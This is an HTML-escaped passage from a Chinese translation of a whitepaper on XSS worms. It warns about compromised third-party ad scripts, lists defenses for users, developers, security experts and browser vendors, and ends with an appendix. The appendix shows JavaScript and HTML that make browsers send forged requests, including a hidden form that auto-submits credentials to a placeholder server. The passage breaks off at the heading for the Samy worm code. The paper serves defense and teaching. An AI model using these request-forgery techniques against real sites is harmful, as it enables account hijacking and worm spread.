“666666”;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;google_color_text = “333333”;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;//--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[&amp;lt;script type=”text/javascript” src=” http://pagead2.googlesyndication.com/page](http://pagead2.googlesyndication.com/pagead/)ad/ show_ads.js”&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;请注意，SCRIPT 标签 SRC 属性和它的值 &lt;a href=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pagead2.googlesyndication.com/pagead/show_ads.js&lt;/a&gt;。在 JavaScript 代码中的 SCRIPT 标签 SRC 属性的值从远程位置（谷歌）调用并在页面加载时，在页面的上下文内执行。 如果“show_ads.js 中”被入侵，并含有一个 XSS 漏洞，使用此代码的所有网站将受到影响。然后，当用户访网页时，他们会成为像受到 Samy 蠕虫感染的用户一样受到感染，但模规更大。这可以很容易地在任何时刻影响百万 计的用户。其他如 DoubleClick 的广告横幅供应商也同样如此。管理者应从第三方部件代码提供商寻求安全保证。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../img/xss-蠕虫-病毒-即将发生的威胁与最好的防御/Image_008.jpg&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;图 10,谷歌 AdSense 的截图&lt;/p&gt;
&lt;p&gt;（&lt;a href=&quot;http://www.google.com/services/adsense_tour/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.google.com/services/adsense_tour/&lt;/a&gt;）&lt;/p&gt;
&lt;h1 id=&quot;最好的防御&quot;&gt;&lt;a href=&quot;#最好的防御&quot; class=&quot;headerlink&quot; title=&quot;最好的防御&quot;&gt;&lt;/a&gt;最好的防御&lt;/h1&gt;&lt;p&gt;在过去超过十年的时间里，反病毒界一直依赖于快速的反应时间来限制蠕虫和病毒所造成的损害。随着新一代 的恶意软件的飞速发展，在事件被稳定前，可能会损失数百万，甚至数十亿美元。这种情况要求我们将采取步骤， 确定疫情的发生和防止问题的发生放在第一位。以下是为了限制这些新品种的病毒和蠕虫的影响而为用户，开发人 员，安全专家和浏览器厂商提供的明确的步骤：&lt;/p&gt;
&lt;h1 id=&quot;用户&quot;&gt;&lt;a href=&quot;#用户&quot; class=&quot;headerlink&quot; title=&quot;用户&quot;&gt;&lt;/a&gt;用户&lt;/h1&gt;&lt;p&gt;1\． 点击链接发送电子邮件或即时消息时一定要谨慎。可疑的过长链接，尤其是那些看起来像是包含 HTML 代码 的链接。如果有疑问，手动输入网址到您的浏览器地址栏进行访问。&lt;/p&gt;
&lt;p&gt;2\． 对于 XSS 漏洞，没有网络浏览器有一个明显的安全优势。话虽如此，但作者喜欢 Firefox 浏览器。为了获得 额外的安全性，可以考虑安装一些浏览器插件，如 NoScript25（Firefox 扩展插件）或 Netcraft 工具栏 26。&lt;/p&gt;
&lt;p&gt;3\． 虽然不是 100％有效，但是避开可疑网站，如那些提供黑客自动化工具，warez，或色情的网站是明智的。&lt;/p&gt;
&lt;h1 id=&quot;开发者&quot;&gt;&lt;a href=&quot;#开发者&quot; class=&quot;headerlink&quot; title=&quot;开发者&quot;&gt;&lt;/a&gt;开发者&lt;/h1&gt;&lt;p&gt;1. 对于开发人员来说，首先需要注意的是应该对所有用户提交的内容执行坚如磐石输入验证。这包括网址，查 询字符串，header，POST 数据等所有用户提交的内容。只接受您所希望的字符，在您指定的长度内，和指定 的相应的数据的格式。组织，过滤，或忽略一切。&lt;/p&gt;
&lt;p&gt;2. 保护被自动执行或来自第三方网站执行的所有敏感功能。在适当的情况使用会话令牌 27、验证码 28 系统或者 HTTP 引用头检查。&lt;/p&gt;
&lt;p&gt;3. 如果您的网站必须支持用户提供的 HTML，那么你是处在一个安全明智的下滑坡。然而，也有一些事情可以 做，来保护您的网站。请确保您收到的 HTML 内容是良好的，只包含最少的一组安全标签（绝对没有 JavaScript）， 没有包含任何引用远程的内容（尤其是样式表和 JavaScript）。而且，为了多一点的安全性，请将 httpOnly29 添 加到您的 cookie&lt;/p&gt;
&lt;h1 id=&quot;安全专家&quot;&gt;&lt;a href=&quot;#安全专家&quot; class=&quot;headerlink&quot; title=&quot;安全专家&quot;&gt;&lt;/a&gt;安全专家&lt;/h1&gt;&lt;p&gt;1. 只有一种方法才能确定您的安全做法提供了足够的保障，那就是经常测试他们。在黑客攻击网站前了解你的 漏洞是是至关重要的。要做到这一点，网站的脆弱性评估是要进行的。报告应提供一个对您的网站的安全的 全面的审视，并描述他们如何应对和进行模拟攻击。WhiteHat Security 提供了一个以 Web 安全威胁分类（WASC） 为测试标准的自动化的漏洞扫描与专家驱动分析的组合方法。&lt;/p&gt;
&lt;p&gt;2. 正确地评估一个网站的安全性可能需要几十个，数以百计，数以千计的安全测试。许多需要手工完成。这就 是为什么 WhiteHat 的 Sentinel 在这样的服务的过程中是一个重要组成部分。源代码和黑盒子扫描产品可以减少人员在开发阶段中测试 Web 应用程序的时间。&lt;/p&gt;
&lt;p&gt;3. 当您的网站绝对没有任何问题了，考虑 Web 应用防火墙（WAF）作为一个额外的防御层。它们可以用来配置 用您的网站的规则并强有力的执行。任何超出规则外的行为将被阻止或者记录。由于这些设备大多是高度多 样化和复杂，可以考虑使用 Web 应用防火墙评价标准（WAFEC）作为比较的工具。&lt;/p&gt;
&lt;h1 id=&quot;浏览器厂商&quot;&gt;&lt;a href=&quot;#浏览器厂商&quot; class=&quot;headerlink&quot; title=&quot;浏览器厂商&quot;&gt;&lt;/a&gt;浏览器厂商&lt;/h1&gt;&lt;p&gt;1. Mozilla（火狐），微软和 Opera 开发团队必须开始正式实施内容限制。现实的情况是，等待 Web 应用软件减 少 XSS 漏洞的任何一种方法都是是不现实的，更不用说减少了 100％。&lt;/p&gt;
&lt;p&gt;2. Mozilla(Firefox)开发者，请执行 httpOnly，它已经出现这么多年了。&lt;/p&gt;
&lt;h1 id=&quot;结论&quot;&gt;&lt;a href=&quot;#结论&quot; class=&quot;headerlink&quot; title=&quot;结论&quot;&gt;&lt;/a&gt;结论&lt;/h1&gt;&lt;p&gt;在恶意软件行业，历史似乎在重演。当一个新的探索领域的出现，首次暴发主要集中在学习传播，而不是破坏或 摧毁系统。恶意软件的作者的实验内容是新的可能性，而且在一开始通常对做损害的事不感兴趣。这并不是说对于那 些参与人来说，相对无害的爆发，不是令人沮丧和昂贵。随着时间的推移，恶意软件的作者的技术显着提高，传播变 得更快，payload 随着后门，rootkit 和僵尸网络的引进变得更具危害性。&lt;/p&gt;
&lt;p&gt;我们处于 XSS 恶意软件探索的早期阶段。Samy 蠕虫，第一个重大的 XSS 蠕虫，在通过传播赢得朋友，并变得出 名方面是一个成功的实验。虽然远远低于如危害帐户或进行拒绝服务攻击的纯属恶意的意图，但 Samy 蠕虫还是引起 了 MySpace 关闭其网站。如果历史继续重演，肯定地说，我们将见证一个传播速度更快，更具破坏性的 XSS 的恶意软 件爆发量的增加。问题是，谁会去做好自己的本分来抵挡我们已经看到的到来的东西？&lt;/p&gt;
&lt;h1 id=&quot;附录&quot;&gt;&lt;a href=&quot;#附录&quot; class=&quot;headerlink&quot; title=&quot;附录&quot;&gt;&lt;/a&gt;附录&lt;/h1&gt;&lt;h2 id=&quot;嵌入式-HTML-标签&quot;&gt;&lt;a href=&quot;#嵌入式-HTML-标签&quot; class=&quot;headerlink&quot; title=&quot;嵌入式 HTML 标签&quot;&gt;&lt;/a&gt;嵌入式 HTML 标签&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;IMG SRC=”http://server/path/”&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;浏览器发送的 HTTP GET 请求类似如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;GET http://server/path/ HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Host: host&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;User-Agent: Firefox/1.5.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;表单也可用于：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;FORM ACTION=”http://server/path/” NAME=”myform” METHOD=”POST”&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;INPUT TYPE=”HIDDEN” NAME=”Username” VALUE=”Foo”&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;INPUT TYPE=”HIDDEN” NAME=”Password” VALUE=”Bar”&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/FORM&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后使用 JavaScript，我们可以自动提交表单：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;SCRIPT language=”JavaScript”&amp;gt; document.myform.submit();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/SCRIPT&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;浏览器发送的 HTTP POST 请求类似如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;POST http://server/path/ HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Host: server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;User-Agent: Firefox/1.5.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Username=Foo&amp;amp;Password=Bar&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一个 JavaScript 发起的表单提交可能导致的网络浏览器发出一个警告对话框，用户可能会进行点击。其他的 html&lt;/p&gt;
&lt;p&gt;标签包括 APPLET，BASE，BODY，EMBED，LAYER，META，OBJECT，LINK，SCRIPT 和 STYLE 也可以达到同样的效果。&lt;/p&gt;
&lt;h2 id=&quot;JavaScript-DOM-对象&quot;&gt;&lt;a href=&quot;#JavaScript-DOM-对象&quot; class=&quot;headerlink&quot; title=&quot;JavaScript DOM 对象&quot;&gt;&lt;/a&gt;JavaScript DOM 对象&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var img = new Image();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;img.src = “http://server/path/”;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;浏览器发送一个 HTTP GET 请求类似如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;GET http://server/path/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Host: server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;User-Agent: Firefox/1.5.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 JavaScript DOM 对象创建一个 HTML 表单：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var form = document.createElement(‘form’);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;form.setAttribute(“action”, “http://server/path/”);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;form.setAttribute(“method”, “POST”);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;form.setAttribute(“name”, “myform”);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var input 1 = document.createElement(‘input’);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;input1.setAttribute(“type”, “hidden”);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;input1.setAttribute(“name”, “Username”);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;input1.setAttribute(“value”, “Foo”);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var input 2 = document.createElement(‘input’);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;input2.setAttribute(“type”, “hidden”);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;input2.setAttribute(“name”, “Password”);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;input2.setAttribute(“value”, “Bar”);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;document.body.appendChild(form);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;form.appendChild(input1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;form.appendChild(input2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;form.myform.submit();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;JavaScript 会自动提交表单，导致 Web 浏览器发送一个 HTTP POST 请求类似如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;POST http://server/path/ HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Host: server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;User-Agent: Firefox/1.5.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Username=Foo&amp;amp;Password=Bar&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;XmlHttpRequest-XHR&quot;&gt;&lt;a href=&quot;#XmlHttpRequest-XHR&quot; class=&quot;headerlink&quot; title=&quot;XmlHttpRequest (XHR)&quot;&gt;&lt;/a&gt;XmlHttpRequest (XHR)&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var req = new XMLHttpRequest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;req.open(‘GET’, ‘http://server/path)/’, true);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;req.onreadystatechange = function () &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (req.readyState == 4) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        alert(req.responseText);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;req.send(null);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;浏览器发送的 HTTP GET 请求类似如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;GET http://server/path/ HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Host: server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;User-Agent: Firefox/1.5.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 XHR 发送一个 POST 请求：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var post_data = “Username=Foo&amp;amp;Password=Bar”;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var req = new XMLHttpRequest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;req.open(POST, ‘ http://host/path/’, true);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;req.onreadystatechange = function () &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (req.readyState == 4) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        alert(req.responseText);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;req.send(post_data);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发送的 POST 请求类似如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;POST http://server/path/ HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Host: server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;User-Agent: Firefox/1.5.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Username=Foo&amp;amp;Password=Bar&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;Samy-蠕虫代码&quot;&gt;&lt;a href=&quot;#Samy-蠕虫代码&quot; class=&quot;headerlink&quot; title=&quot;Samy 蠕虫代码&quot;&gt;&lt;/a&gt;Samy 蠕虫代码&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span 